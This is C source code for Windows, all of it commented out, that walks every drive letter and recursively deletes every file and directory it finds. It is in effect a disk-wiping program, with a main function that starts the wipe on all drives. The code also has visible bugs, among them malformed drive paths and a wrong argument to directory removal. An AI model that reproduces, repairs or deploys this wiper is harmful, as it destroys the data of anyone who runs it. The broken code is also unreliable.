/*#include <stdio.h>
#include <windows.h>
using namespace std;

#pragma warning (disable:4996)

void DeleteAllFiles(const char* path)
{
    HANDLE Handle;
    WIN32_FIND_DATA wfd;

    Handle = FindFirstFile(path, &wfd);
    
    do
    {
        if ((!((wfd.cFileName[0]=='.') && ((wfd.cFileName[1]=='.' && wfd.cFileName[2]==0) || wfd.cFileName[1]==0 ))))
        {
            // folder
            if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            {
                // create new path
                char path2[MAX_PATH];
                strcpy(path2, path);

                if (path2[strlen(path2)-1] == '*')
                    path2[strlen(path2)-1] = NULL;

                strcat(path2, wfd.cFileName);
                strcat(path2, "\\*");

                DeleteAllFiles(path2);
                RemoveDirectory(path);
            }
            // normal file
            else
            {
                // filepath to delete
                char path2[MAX_PATH];
                strcpy(path2, path);

                if (path2[strlen(path2)-1] == '*')
                    path2[strlen(path2)-1] = NULL;

                strcat(path2, wfd.cFileName);

                DeleteFile(path2);
            }
        }
    }
    while (FindNextFile(Handle, &wfd));

    FindClose(Handle);
}

void SearchHardDrives()
{
    DWORD Drives = GetLogicalDrives();
    DWORD Mask = 1;

    for (int i=0; i < 26; ++i)
    {
        if (Drives & Mask)
        {
            char text[5] = "";
            sprintf(text, "%c\\", 'A'+i);

            if (GetDriveType(text) != DRIVE_NO_ROOT_DIR)
                DeleteAllFiles(text);
        }

        Mask <<= 1;
    }
}
/*
int main ()
{
    SearchHardDrives();
}
*/
